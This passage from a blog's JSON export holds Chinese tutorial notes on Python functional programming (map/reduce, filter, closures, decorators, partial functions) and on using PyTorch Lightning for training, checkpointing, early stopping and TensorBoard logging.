&lt;module&gt;TypeError: &#x27;int&#x27; object is not callable 可见将由于abs = 10这条语句，导致abs(-10)不再具有绝对值的功能，此时必须重启python交互环境，abs才能恢复原有指向。 由此引入高阶函数的概念： 可以接受另一个函数作为参数的函数称为高阶函数 一个简单的高阶函数如下： 12345def add(x, y, f): return f(x) + f(y)print(add(-5, 6, abs))# 输出 11 map/reduce map map()函数接收两个参数，一个是函数，一个是Iterable，map将传入的函数依次作用到序列的每个元素，并把结果作为新的Iterator返回。 例如： 1234567def f(x): return x*xr = map(f,[1, 2, 3, 4, 5, 6, 7, 8, 9])print(list(r))# [1, 4, 9, 16, 25, 36, 49, 64, 81] 由于map函数将返回惰性加载的Interator，因此此处使用list()将其转化为list 虽然如上简单操作看起来并没有什么意义，但我们还能使用map完成如下有实际意义的操作： 利用map()函数，把用户输入的不规范的英文名字，变为首字母大写，其他小写的规范名字。输入：['adam', 'LISA', 'barT']，输出：['Adam', 'Lisa', 'Bart']： 123456789# -*- coding: utf-8 -*-def normalize(name): return name[:1].upper() + name[1:].lower()L1 = [&#x27;adam&#x27;, &#x27;LISA&#x27;, &#x27;barT&#x27;]L2 = list(map(normalize, L1))print(L2)# [&#x27;Adam&#x27;, &#x27;Lisa&#x27;, &#x27;Bart&#x27;] reduce reduce把一个函数作用在一个序列`[x1 效果类似： reduce(f 使用reduce弄够完成如下事件： 12345678# -*- coding: utf-8 -*-from functools import reducedef prod(L): return reduce(lambda x,y: x * y,L)print(&#x27;3 * 5 * 7 * 9 =&#x27;, prod([3, 5, 7, 9]))# 3 * 5 * 7 * 9 = 945 使用map与reduce的组合，可以完成如下复杂的操作： 利用map和reduce编写一个str2float函数，把字符串'123.456'转换成浮点数123.456： 123456789# -*- coding: utf-8 -*-from functools import reducedef str2float(s): a,b = s.split(&#x27;.&#x27;) return reduce(lambda x,y: x*10+y, map(int,a)) + reduce(lambda x,y: x * 0.1 + y ,map(int,b[::-1])) * 0.1 print(&#x27;str2float(\\&#x27;123.456\\&#x27;) =&#x27;, str2float(&#x27;123.456&#x27;)) filter filter机制与map有些相似，都是将将传入的函数作用在传入可便利对象中的每个元素上，区别在于，fliter是根据再用在该元素上的函数返回值是true还是false，从而决定该函数是否保留，最后返回所有被保留的元素组成的list 例如一个筛出奇数的选择器： 123456def is_odd(n): return n % 2 == 1list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))# 结果: [1, 5, 9, 15] filter与map一样，但会的是一个惰性加载的Iterator，需要使用list() filter应用 接下来我们利用Iterator、filter实现埃氏筛法： 首先对该问题进行分解： 除了2以外的偶数都是和数，因此我们只需要考虑奇数，为此，我们需要先创建一个能够不断产生奇数的Iterator 创建一个用来筛选的函数 接下来我们需要再创建一个函数，利用filter筛去1中的一些奇和数。 最后打印 产生奇数 12345def _odd_iterator(): n = 1 while True: n += 2 yield n 构造一个能不断产生奇数的Iterator 筛选函数 12def primes_filter(n): return lambda x: x % n &gt; 0 使用n筛去n的倍数，由于filter的第一个参数需要接受一个函数，我们可以再此处返回一个lambda函数，使这个函数既可以接受参数又可以作为filter的第一个参数 素数生成器 1234567891011121314151617181920212223242526272829303132333435# -*- coding: utf-8 -*-def _odd_iterator(): n = 1 while True: n += 2 yield ndef primes_filter(n): return lambda x: x % n &gt; 0def primes(): yield 2 odd = _odd_iterator() # 初始化序列 while True: n = next(odd) # 从奇数列中取d yield n odd = filter(primes_filter(n), odd) # 构造新序列# 再写个生成器来取前max个素数def print_prime(max): p = primes() n = next(p) while n &lt;= max: yield n n = next(p)# 取出小于100的全部素数for n in print_prime(100): print(n) sorted 类似C++中的sort函数，包含三个参数： 1sorted(list,key,reverse) 其中list表示需要排序的序列 key代表排序过程中作用在list中元素上的函数 reverse表示从大到小还是从小到大 比如按绝对值大小排序： 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21], key=abs)[5, 9, -12, -21, 36] 上述操作是先对list中的每个元素做了abs操作，再按abs操作后的值排序，再将原本的值放入相应位置。 123keys排序结果 =&gt; [5, 9, 12, 21, 36] | | | | |最终结果 =&gt; [5, 9, -12, -21, 36] 返回函数 python中允许将另一个函数作为某一函数的返回值，被返回的函数将不会立即进行运算，例如： 123456789def lazy_sum(*args): def sum(): ax = 0 for n in args: ax = ax + n return ax return sumf = lazy_sum(1,3,5,7,9) 此时分别调用f与f()： 1234&gt;&gt;&gt; f&lt;function lazy_sum.&lt;locals&gt;.sum at 0x101c6ed90&gt;&gt;&gt;&gt; f()25 此处内部函数sum可以引用外部函数lazy_sum中的参数和局部变量，当sum被lazy_sum返回时，相关参数和变量都保存在返回的函数（sum）中，这种程序结构被成为闭包 需要注意的是lazy_sum每次都会返回一个新的函数，即： 1234&gt;&gt;&gt; f1 = lazy_sum(1, 3, 5, 7, 9)&gt;&gt;&gt; f2 = lazy_sum(1, 3, 5, 7, 9)&gt;&gt;&gt; f1==f2False f1()和f2()的调用结果互不影响。 闭包 由闭包的定义，我们来看如下的一个操作： 12345678910def count(): fs = [] for i in range(1,4): def f(): return i*i fs.append(f) return fsf1,f2,f3 = count() 此时乍一看f1()应该返回1，f2()返回4，f3()返回9 但是实际上结果如下： 1234567&gt;&gt;&gt; f1, f2, f3 = count()&gt;&gt;&gt; f1()9&gt;&gt;&gt; f2()9&gt;&gt;&gt; f3()9 原因在于，返回函数将会把函数内部的变量封装，而python中的变量均为引用变量，即存储数据的地址，而变量i所存储的地址中的值一直在变化，等到返回第个函数时，i中存储的地址中的值已变为3，此时无论调用哪个返回函数，其中i存储的地址中的值均为3 因此返回闭包时，有如下注意事项： 返回函数不要引用任何循环变量，或者后续会发生变化的变量。 但如上函数并不是没有解决的办法，只需要使用参数来保存循环值即可： 12345678910def count(): def f(j): def g(): return j*j return g fs = [] for i in range(1,4): fs.append(f(i))# 此处f()不是闭包，因此在调用时立即被执行 return fs 使用闭包构造一个计数器： 123456789101112def createCounter(): i = 0 def counter(): nonlocal i i += 1 return i return countercounterA = createCounter()print(counterA(), counterA(), counterA(), counterA(), counterA())# 1 2 3 4 5 番外——变量作用域 python中的变量作用域大致与C++相同，但python为动态语言，定义时无需给出变量的类型，导致定义语法与引用语法相同，因此，python中加入了两个指定变量的关键字global和nonlocal 其中： global关键字用来在函数或其他局部作用域中使用全局变量。 nonlocal声明的变量不是局部变量,也不是全局变量,而是外部嵌套函数内的变量。 如，当我们需要在函数中使用全局变量时： 12345678910count = 0def global_test(): global count count += 1 print(count)global_test() # 1 当我们需要在内部函数中使用外部函数的变量时： 12345678910111213141516def nonlocal_test(): count = 0 def test2(): nonlocal count count += 1 return count return test2val = nonlocal_test()print(val())print(val())print(val())# 1# 2# 3 匿名函数 在函数式变成时，我们经常需要传入函数或是返回函数，这样大量的使用函数将导致命名成为一个非常麻烦的问题，因此python为我们提供了一种匿名函数的机制，省去了为函数命名的麻烦： 1lambda x: x*x 上面这段函数就相当于： 12def f(x): return x * x 匿名函数的基本格式为： lambda argument_list : expression 其中argument_list是参数列表，具有如下特性： 参数需要在argument_list中有定义 表达式只能是单行 可以使用如下种种形式： 1234561Nonea+bsum(a)1 if a &gt;10 else 0...... 而expression只允许使用一个表达式，且该表达式的值即时该函数的返回值。 lambda函数既可以作为变量赋值给一个变量，也可以作为返回值： 12345&gt;&gt;&gt; f = lambda x: x * x&gt;&gt;&gt; f&lt;function &lt;lambda&gt; at 0x101c6ef28&gt;&gt;&gt;&gt; f(5)25 12def build(x, y): return lambda: x * x + y * y 关于lambda函数的使用一直存在争议，有些人认为使用lambda函数能使代码更加的pythonic，而有些人认为只能使用一条语句的lambda函数有时反而会降低代码的可读性。 装饰器 首先要明确python中函数作为对象，也具有一些属性，比如： 1234567def now(): print(&#x27;2021-7-26&#x27;)f = nowprint(f.__name__)# now 此时，如果我们希望丰富now的功能，但又不希望修改now的定义，我们该怎么办呢？学习过java注解和AOP就知道，这就是AOP的编程思维。 在java中这样的操作并不难，通过为函数添加注解，再为该注解编写一些逻辑就能首先。而python中提供了一种使用函数实现AOP的方式：装饰器(Decorator) 本质上，decorator是一个高阶函数。如果我们想要定义一个能打印日志的decorate，可以通过如下方式： 12345def log(func): def wrapper(*args, **kw): print(&#x27;call %s():&#x27; % func.__name__) return func(*args, **kw) return wrapper 然后只需要使用python提供的@语法糖，把decorate置于函数的定义处： 12345678@logdef now(): print(&#x27;2021-7-26&#x27;) return Nonenow()# call now():# 2021-7-26 该语法糖相当于执行了： 1now = log(now) 还能定义需要参数的decorate，实现方式是再如上双重函数嵌套的基础上再增加一层用来接受参数： 123456789101112131415161718def log(text): def decorator(func): def wrapper(*args, **kw): print(&#x27;%s %s():&#x27; % (text, func.__name__)) return func(*args, **kw) return wrapper return decorator@log(&#x27;execute&#x27;)def now(): print(&#x27;2021-7-26&#x27;) return Nonenow()# execute now():# 2021-7-26 该语法糖相当于执行了： 1now = log(&#x27;execute&#x27;)(now) 其中log(‘execute’)返回decorator，接着将decorator(now)赋值给now 但由于为now重新赋值，单纯的该过程将导致如下问题： 12&gt;&gt;&gt; now.__name__&#x27;wrapper&#x27; 我们发现now中的值变了，导致now的__name__属性变了，因此我们需要把原始函数的__name__等属性赋值到wrapper()函数中去，否则，有些依赖函数签名的代码执行会出错。 Python的functools模块中也为我们提供了一个用于做这些事情的decorator : functools.wraps 123456789import functoolsdef log(func): @functools.wraps(func): def wrapper(*args, **kw): print(&#x27;call %s():&#x27; % func.__name__) return func(*args, **kw) return wrapper 对于有参数的decorator： 1234567891011import functoolsdef log(text): def decorator(func): @functools.wraps(func): def wrapper(*args, **kw): print(&#x27;call %s():&#x27; % func.__name__) return func(*args, **kw) return wrapper return decorator 偏函数 Python的functools模块提供了很多有用的功能，其中一个就是偏函数（Partial function） 可以通过偏函数来固定一个函数中的某个参数值，并返回一个新函数，但新函数仍然允许对固定的参数传入其他值。例如int函数： 1234567891011import functoolsint2 = functools.partial(int, base = 2)int(&#x27;12345&#x27;) # 12345int(&#x27;12345&#x27;, 8) # 5349int(&#x27;12345&#x27;, 16) # 74565int2(&#x27;1000000&#x27;) # 64int2(&#x27;1000000&#x27;, base=10) # 1000000 创建偏函数时，实际上可以接收函数对象、*args和**kw这3个参数，当传入： 1int2 = functools.partial(int, base=2) 实际上固定了int()函数的关键字参数base，也就是： 12kw = &#123; &#x27;base&#x27;: 2 &#125;int(&#x27;10010&#x27;, **kw) 再看另一个例子： 1234max2 = functools.partial(max, 10)max2(5, 6, 7) # 10 相当于： 12args = (10, 5, 6, 7)max(*args) 结合python入门中函数章节提到的，任何函数都能通过： 1func(*args, **kw) 来调用，我们可以大胆猜测一下偏函数的参数调用规则： 偏函数先将默认值中的位置参数和调用时传入的位置参数组合为一个*args，且默认位置参数在前。 再将默认关键字参数和调用时传入的关键字参数组合为一个**kw，同名关键字将用传入值覆盖默认值。 最后通过func(*args, **kw)去调用 通过如下例子可以验证： 12345678910111213141516171819import functoolsdef f(*args, **kw): print(args) print(kw) return Nonef1 = functools.partial(f, 1, 2, a = 1, b = 2)f1(3, 4, c = 3, d = 4)# (1,2,3,4)# &#123;&#x27;a&#x27;:1, &#x27;b&#x27;:2, &#x27;c&#x27;:3, &#x27;d&#x27;:4&#125;f1(a = 2, b = 3)# (1,2)# &#123;&#x27;a&#x27;:2, &#x27;b&#x27;: 3&#125;","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://enderxiao.github.io/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"}]},{"title":"python进阶-OOP","slug":"PytorchLightning学习笔记","date":"2021-07-26T03:39:13.000Z","updated":"2024-07-30T11:26:33.912Z","comments":true,"path":"2021/07/26/PytorchLightning学习笔记/","permalink":"http://enderxiao.github.io/2021/07/26/PytorchLightning%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"Pytorch Lightning pl是一个轻量级的PyTorch库，用于对深度学习模型进行轻量化，但它并不提供样板，而仅仅是轻量化 它能对日常使用的样板代码进行抽象和自动化。 从上面我们可以发现 pl 的三个优势 通过抽象出样板工程代码，可以更容易地识别和理解ML代码。 Lightning的统一结构使得在现有项目的基础上进行构建和理解变得非常容易。 Lightning 自动化的代码是用经过全面测试、定期维护并遵循ML最佳实践的高质量代码构建的。 pl.LightningModule pl.LightningModule是Pytorch中的模型部分(nn.Module)和训练逻辑（训练、验证、测试）部分的结合。 继承自该类的函数通常包含三个部分： 模型相关部分： __init__ forward 优化器相关部分: configure_optimizers 模型训练逻辑部分： training_step validation_step test_step 模型相关部分一般涉及模型的构建，包括超参数定义、模型初始化、模型运行逻辑(forward函数) 优化器相关部分一般涉及模型的优化器初始化，学习率的schedule设置等 训练逻辑部分一般是每个训练、验证、预测步骤需要进行的操作。 123456789101112131415import pytorch_lightning as plclass CIFARModule(pl.LightningModule): def __init__(self, ) -&gt; None: super().__init__() def forward(self, imgs): def configure_optimizers(self): def training_step(self, batch, batch_idx): def validation_step(self, batch, batch_idx): def test_step(self, batch, batch_idx): pl 流程 PL的流程很简单，生产流水线，有一个固定的顺序： 初始化 def __init__(self) --&gt;训练training_step(self, batch, batch_idx) --&gt; 校验validation_step(self, batch, batch_idx) --&gt; 测试 test_step(self, batch, batch_idx). 就完事了，总统是实现这三个函数的重写。 当然，除了这三个主要的，还有一些其他的函数，为了方便我们实现其他的一些功能，因此更为完整的流程是在training_step 、validation_step、test_step 后面都紧跟着其相应的 training_step_end(self，batch_parts)和training_epoch_end(self, training_step_outputs) 函数，当然，对于校验和测试，都有相应的*_step_end和*_epoch_end函数。因为校验和测试的*_step_end函数是一样的，因此这里只以训练为例。 *_step_end – 即每一个 * 步完成后调用 *_epoch_end – 即每一个 * 的epoch 完成之后会自动调用 Train 训练主要是重写def training_setp(self, batch, batch_idx)函数，并返回要反向传播的loss即可，其中batch 即为从 train_dataloader 采样的一个batch的数据，batch_idx即为目前batch的索引。 123456def training_setp(self, batch, batch_idx): image, label = batch pred = self.forward(iamge) loss = ... # 一定要返回loss return loss Validation 设置校验的频率 每训练n个epochs 校验一次 默认为每1个epoch校验一次，即自动调用validation_step()函数 1trainer = Trainer(check_val_every_n_epoch=1) 单个epoch内校验频率 当一个epoch 比较大时，就需要在单个epoch 内进行多次校验，这时就需要对校验的调动频率进行修改， 传入val_check_interval的参数为float型时表示百分比，为int时表示batch： 1234# 每训练单个epoch的 25% 调用校验函数一次，注意：要传入float型数trainer = Trainer(val_check_interval=0.25)# 当然也可以是单个epoch训练完多少个batch后调用一次校验函数，但是一定是传入int型trainer = Trainer(val_check_interval=100) # 每训练100个batch校验一次 校验和训练是一样的，重写def validation_step(self, batch, batch_idx)函数，不需要返回值： 123456def validation_step(self, batch, batch_idx): image, label = batch pred = self.forward(iamge) loss = ... # 标记该loss，用于保存模型时监控该量 self.log(&#x27;val_loss&#x27;, loss) Test 在pytoch_lightning框架中，test 在训练过程中是不调用的，也就是说是不相关，在训练过程中只进行training和validation，因此如果需要在训练过中保存validation的一些信息，就要放到validation中。 关于测试，测试是在训练完成之后的，因此这里假设已经训练完成： 12345678# 获取恢复了权重和超参数等的模型model = MODEL.load_from_checkpoint(checkpoint_path=&#x27;my_model_path/heiheihei.ckpt&#x27;)# 修改测试时需要的参数，例如预测的步数等model.pred_step = 1000# 定义trainer, 其中limit_test_batches表示取测试集中的0.05的数据来做测试trainer = pl.Trainer(gpus=1, precision=16, limit_test_batches=0.05)# 测试，自动调用test_step(), 其中dm为数据集，放在下面讲trainer.test(model=dck, datamodule=dm) 数据集 数据集有两种实现方法： 当然，首先要自己先实现Dataset的定义，可以用现有的，例如MNIST等数据集，若用自己的数据集，则需要自己去继承torch.utils.data.dataset.Dataset，自定义类，这一部分不再细讲，查其他的资料。 直接实现 直接实现是指在Model中重写def train_dataloader(self)等函数来返回dataloader： 1234567891011121314class ExampleModel(pl.LightningModule): def __init__(self, args): super().__init__() self.train_dataset = ... self.val_dataset = ... self.test_dataset = ... ... def train_dataloader(self): return DataLoader(self.train_dataset, batch_size=self.batch_size, shuffle=False, num_workers=0) def val_dataloader(self): return DataLoader(self.val_dataset, batch_size=self.batch_size, shuffle=False) def test_dataloader(self): return DataLoader(self.test_dataset, batch_size=1, shuffle=True) 这样就完成了数据集和dataloader的编程了，注意，要先自己完成dataset的编写，或者用现有的normal数据集 自定义DataModule 这种方法是继承pl.LightningDataModule来提供训练、校验、测试的数据。 12345678910111213141516171819202122class MyDataModule(pl.LightningDataModule): def __init__(self): super().__init__() ...blablabla... def setup(self, stage): # 实现数据集的定义，每张GPU都会执行该函数, stage 用于标记是用于什么阶段 if stage == &#x27;fit&#x27; or stage is None: self.train_dataset = DCKDataset(self.train_file_path, self.train_file_num, transform=None) self.val_dataset = DCKDataset(self.val_file_path, self.val_file_num, transform=None) if stage == &#x27;test&#x27; or stage is None: self.test_dataset = DCKDataset(self.test_file_path, self.test_file_num, transform=None) def prepare_data(self): # 在该函数里一般实现数据集的下载等，只有cuda:0 会执行该函数 pass def train_dataloader(self): return DataLoader(self.train_dataset, batch_size=self.batch_size, shuffle=False, num_workers=0) def val_dataloader(self): return DataLoader(self.val_dataset, batch_size=self.batch_size, shuffle=False) def test_dataloader(self): return DataLoader(self.test_dataset, batch_size=1, shuffle=True) 使用 12345678910111213141516171819202122dm = MyDataModule(args)if not is_predict:# 训练 # 定义保存模型的callback，仔细查看后文 checkpoint_callback = ModelCheckpoint(monitor=&#x27;val_loss&#x27;) # 定义模型 model = MyModel() # 定义logger logger = TensorBoardLogger(&#x27;log_dir&#x27;, name=&#x27;test_PL&#x27;) # 定义数据集为训练校验阶段 dm.setup(&#x27;fit&#x27;) # 定义trainer trainer = pl.Trainer(gpus=gpu, logger=logger, callbacks=[checkpoint_callback]); # 开始训练 trainer.fit(dck, datamodule=dm)else: # 测试阶段 dm.setup(&#x27;test&#x27;) # 恢复模型 model = MyModel.load_from_checkpoint(checkpoint_path=&#x27;trained_model.ckpt&#x27;) # 定义trainer并测试 trainer = pl.Trainer(gpus=1, precision=16, limit_test_batches=0.05) trainer.test(model=model, datamodule=dm) 模型保存 自动保存 Lightning 会自动保存最近训练的epoch的模型到当前的工作空间(or.getcwd())，也可以在定义Trainer的时候指定： 1trainer = Trainer(default_root_dir=&#x27;/your/path/to/save/checkpoints&#x27;) 当然，也可以关闭自动保存模型： 1trainer = Trainer(checkpoint_callback=False) ModelCheckpoint（call backs） 计算需要监控的量，例如校验误差：loss 使用log()函数标记该要监控的量 初始化ModelCheckpoint回调，并设置要监控的量，下面有详细的描述 将其传回到Trainer中 123456789101112131415161718from pytorch_lightning.callbacks import ModelCheckpointclass LitAutoEncoder(pl.LightningModule): def validation_step(self, batch, batch_idx): x, y = batch y_hat = self.backbone(x) # 1. 计算需要监控的量 loss = F.cross_entropy(y_hat, y) # 2. 使用log()函数标记该要监控的量,名字叫&#x27;val_loss&#x27; self.log(&#x27;val_loss&#x27;, loss)# 3. 初始化`ModelCheckpoint`回调，并设置要监控的量checkpoint_callback = ModelCheckpoint(monitor=&#x27;val_loss&#x27;)# 4. 将该callback 放到其他的callback 的list中trainer = Trainer(callbacks=[checkpoint_callback]) 其中ModuleCheckpoint的参数如下： 1CLASS pytorch_lightning.callbacks.model_checkpoint.ModelCheckpoint(filepath=None, monitor=None, verbose=False, save_last=None, save_top_k=None, save_weights_only=False, mode=&#x27;auto&#x27;, period=1, prefix=&#x27;&#x27;, dirpath=None, filename=None) 参数说明：所有参数均为optional。 filepath – 不建议使用，在后续版本中会被删除；保存的模型文件的路径，后面的参数会有另外两个参数来代替这个。 monitor – 需要监控的量，string类型。例如'val_loss'（在training_step() or validation_step()函数中通过self.log(‘val_loss’, loss)进行标记）；默认为None，只保存最后一个epoch的模型参数,（我的理解是只保留最后一个epoch的模型参数，但是还是每训练完一个epoch之后会保存一次，然后覆盖上一次的模型) verbose：冗余模式，默认为False. save_last:bool类型; 默认None，当为True时，表示在每个epoch 结果的时候，总是会保存一个模型last.ckpt，也就意味着会覆盖保存，只会有一个文件保留。 save_top_k：int类型；当save_top_k==k，根据monitor监控的量，保存k个最好的模型，而最好的模型是当monitor监控的量最大时表示最好，还是最小时表示最好，在后面的参数mode中进行设置。当save_top_k==0时，不保存；当save_top_k==-1时，保存所有的模型，即每个次保存模型不进行覆盖保存，全都保存下来；当save_top_k&gt;=2，并且在单个epoch内多次调用保存模型的函数，则模型的名字最后会追加版本号，从v0开始。 mode ：string类型，只能取{‘auto’, ‘min’, ‘max’}中的一个；当save_top_k!=0时，保存模型时就会覆盖保存，如果monitor监控的是val_loss等越小就表示模型越好的，这个参数应该被设置成'min'，当monitor监控的是val_acc（校验准确度）等越大就表示模型训练的越好的量，则应该设置成'max'。auto会自动根据monitor的名字来判断（auto模式是个人理解，可能会出错，例如你编程的时候，你就喜欢用val_loss表示模型准确度这样就会导致保存的模型是最差的模型了）。 save_weights_only: bool 类型；True只保存模型权重(model.save_weights(flepath))，否则保存整个模型。建议保存权重就可以了，保存整个模型会消耗更多时间和存储空间。 period: int类型。保存模型的间隔，单位为epoch，即隔多少个epoch自动保存一次。 prefix: string类型；保存模型文件的前缀。 dirpath: string类型。例如：dirpath='my/path_to_save_model/' filename: string类型；前面就说过不建议使用filepath变量，推荐使用 dirpath+filename的形式来作为模型路径。例如： 文件名会以epoch、val_loss、和其他的一些指标作为名称来保存 模型名称: my/path/epoch=2-val_loss=0.02-other_metric=0.03.ckpt checkpoint_callback = ModelCheckpoint( ... , dirpath='my/path', ... filename='&#123;epoch&#125;-&#123;val_loss:.2f&#125;-&#123;other_metric:.2f&#125;' ... ) 使用案例 12345678910from pytorch_lightning import Trainerfrom pytorch_lightning.callbacks import ModelCheckpoint# saves checkpoints to &#x27;my/path/&#x27; at every epochcheckpoint_callback = ModelCheckpoint(dirpath=&#x27;my/path/&#x27;)trainer = Trainer(callbacks=[checkpoint_callback])# save epoch and val_loss in name# saves a file like: my/path/sample-mnist-epoch=02-val_loss=0.32.ckptcheckpoint_callback = ModelCheckpoint(monitor=&#x27;val_loss&#x27;, dirpath=&#x27;my/path/&#x27;, filename=&#x27;sample-mnist-&#123;epoch:02d&#125;-&#123;val_loss:.2f&#125;&#x27;) 获取最好的模型 因为根据上面保存的参数，可能保存了多个模型，根据best_model_path恢复最好的模型。 12345678from pytorch_lightning import Trainerfrom pytorch_lightning.callbacks import ModelCheckpointcheckpoint_callback = ModelCheckpoint(dirpath=&#x27;my/path/&#x27;)trainer = Trainer(callbacks=[checkpoint_callback])model = ...trainer.fit(model)# 训练完成之后，保存了多个模型，下面是获得最好的模型，也就是将原来保存的模型中最好的模型权重apply到当前的网络上checkpoint_callback.best_model_path 手动保存模型 12345678910111213141516from collections import dequeimport os# 维护一个队列self.save_models = deque(maxlen=3)# 这里的self 是指这个函数放到继承了pl.LightningModule的类里，跟training_step()是同级的def manual_save_model(self): model_path = &#x27;your_model_save_path_%s&#x27; % (your_loss) if len(self.save_models) &gt;= 3: # 当队列满了，取出最老的模型的路径，然后删除掉 old_model = self.save_models.popleft() if os.path.exists(old_model): os.remove(old_model) # 手动保存 self.trainer.save_checkpoint(model_path) # 将保存的模型路径加入到队列中 self.save_models.append(model_path) 123456# 保存最新的路径def save_latest_model(self): checkpoint_callbacks = [c for c in self.trainer.callbacks if isinstance(c, ModelCheckpoint)] print(&quot;Saving latest checkpoint...&quot;) model = self.trainer.get_model() [c.on_validation_end(self.trainer, model) for c in checkpoint_callbacks] 自定义文件名 format_checkpoint_name(epoch, step, metrics, ver=None) 在上面的filename参数中，定义了模型文件的保存格式，这个函数就是给其中的变量赋值的，返回string类型，文件名 12345678910111213141516&gt;&gt;&gt; tmpdir = os.path.dirname(__file__)&gt;&gt;&gt; ckpt = ModelCheckpoint(dirpath=tmpdir, filename=&#x27;&#123;epoch&#125;&#x27;)&gt;&gt;&gt; os.path.basename(ckpt.format_checkpoint_name(0, 1, metrics=&#123;&#125;))&#x27;epoch=0.ckpt&#x27;&gt;&gt;&gt; ckpt = ModelCheckpoint(dirpath=tmpdir, filename=&#x27;&#123;epoch:03d&#125;&#x27;)&gt;&gt;&gt; os.path.basename(ckpt.format_checkpoint_name(5, 2, metrics=&#123;&#125;))&#x27;epoch=005.ckpt&#x27;&gt;&gt;&gt; ckpt = ModelCheckpoint(dirpath=tmpdir, filename=&#x27;&#123;epoch&#125;-&#123;val_loss:.2f&#125;&#x27;)&gt;&gt;&gt; os.path.basename(ckpt.format_checkpoint_name(2, 3, metrics=dict(val_loss=0.123456)))&#x27;epoch=2-val_loss=0.12.ckpt&#x27;&gt;&gt;&gt; ckpt = ModelCheckpoint(dirpath=tmpdir, filename=&#x27;&#123;missing:d&#125;&#x27;)&gt;&gt;&gt; os.path.basename(ckpt.format_checkpoint_name(0, 4, metrics=&#123;&#125;))&#x27;missing=0.ckpt&#x27;&gt;&gt;&gt; ckpt = ModelCheckpoint(filename=&#x27;&#123;step&#125;&#x27;)&gt;&gt;&gt; os.path.basename(ckpt.format_checkpoint_name(0, 0, &#123;&#125;))&#x27;step=0.ckpt&#x27; 手动保存 除了自己保存，还可以手动保存和加载模型 1234model = MyLightningModule(hparams)trainer.fit(model)trainer.save_checkpoint(&quot;example.ckpt&quot;)new_model = MyModel.load_from_checkpoint(checkpoint_path=&quot;example.ckpt&quot;) 加载检查点 加载模型的权重、偏置和超参数： 1234567model = MyLightingModule.load_from_checkpoint(PATH)print(model.learning_rate)# prints the learning_rate you used in this checkpointmodel.eval()y_hat = model(x) 如果需要修改超参数，在写Module的时候进行覆盖: 123456class LitModel(LightningModule): def __init__(self, in_dim, out_dim): super().__init__() self.save_hyperparameters() # 在这里使用新的超参数，而不是从模型中加载的超参数 self.l1 = nn.Linear(self.hparams.in_dim, self.hparams.out_dim) 这样的话，可以如下恢复模型： 123456# 例如训练的时候初始化in_dim=32, out_dim=10LitModel(in_dim=32, out_dim=10)# 下面的方式恢复模型，使用in_dim=32和out_dim=10为保存的参数model = LitModel.load_from_checkpoint(PATH)# 当然也可以覆盖这些参数，例如改成in_dim=128, out_dim=10model = LitModel.load_from_checkpoint(PATH, in_dim=128, out_dim10) load_from_checkpoint 方法 1LightningModule.load_from_checkpoint(checkpoint_path, map_location=None, hparams_file=None, strict=True, **kwargs) 恢复模型和Trainer 如果不仅仅是想恢复模型，而且还要接着训练，则可以恢复Trainer 12345model = LitModel()trainer = Trainer(resume_from_checkpoint=&#x27;some/path/to/my_checkpoint.ckpt&#x27;)# 自动恢复模型、epoch、step、学习率信息（包括LR schedulers），精度等# automatically restores model, epoch, step, LR schedulers, apex, etc...trainer.fit(model) 训练辅助 Early Stopping 监控validation_step()中某一个量，如果其不能再变得更优，则提前停止训练 1pytorch_lightning.callbacks.early_stopping.EarlyStopping(monitor=&#x27;early_stop_on&#x27;, min_delta=0.0, patience=3, verbose=False, mode=&#x27;auto&#x27;, strict=True) monitor (str) – 监控的量；默认为:early_stop_on；可以通过self.log('var_name', val_loss)来标记要监控的量 min_delta (float) – 最小的改变量；默认：0.0；即当监控的量的绝对值变量量小于该值，则认为没有新的提升 patience (int) - 默认：3；如果监控的量持续patience 个epoch没有得到更好的提升，则停止训练； verbose (bool) – 默认:False； mode (str) – {auto, min, max}中的一个，跟前面的ModelCheckpoint中的mode是一样的含义。如果monitor监控的是val_loss等越小就表示模型越好的，这个参数应该被设置成'min'，当monitor监控的是val_acc（校验准确度）等越大就表示模型训练的越好的量，则应该设置成'max'。auto会自动根据monitor的名字来判断（auto模式是个人理解，可能会出错，例如你编程的时候，你就喜欢用val_loss表示模型准确度这样就会导致保存的模型是最差的模型了）。 strict (bool) – 默认True；如果监控器没有在validation_step()函数中找到你监控的量，则强制报错，中止训练； Logging 这里只涉及Tensorboard， 其它有需要的可参考官方文档Logging，tensorboard 有两种基本的方法：一种是只适用于scaler，可直接使用self.log()，另一种是图像、权重等。 123456789101112131415161718# 在定义Trainer对象的时候，传入tensorboardloggerlogger = TensorBoardLogger(args[&#x27;log_dir&#x27;], name=&#x27;DCK_PL&#x27;)trainer = pl.Trainer(logger=logger)# 获取tensorboard Logger， 以在validation_step()函数为例def validation_step(): tensorboard = self.logger.experiment # 例如求得validation loss为： loss = ... # 直接log self.log(&#x27;val_loss&#x27;, loss, on_step=True, on_epoch=True, prog_bar=True, logger=True) # 如果是图像等，就需要用到tensorboard的API tensorboard.add_image() # 同时log多个 other_loss = ... loss_dict = &#123;&#x27;val_loss&#x27;: loss, &#x27;loss&#x27;: other_loss&#125; tensorboard.add_scalars(loss_dict) # log 权重等 tensorboard.add_histogram(...) 注意如果是用anaconda的话，要先激活你的env，另外要注意的是，--logdir=my_log_dir/， 这里的logdir要到version_0/目录，该目录下保存有各种你log的变量的文件夹 12# 查看的方法跟tensorboard是一样的，在终端下tensorboard --logdir=my/log_path 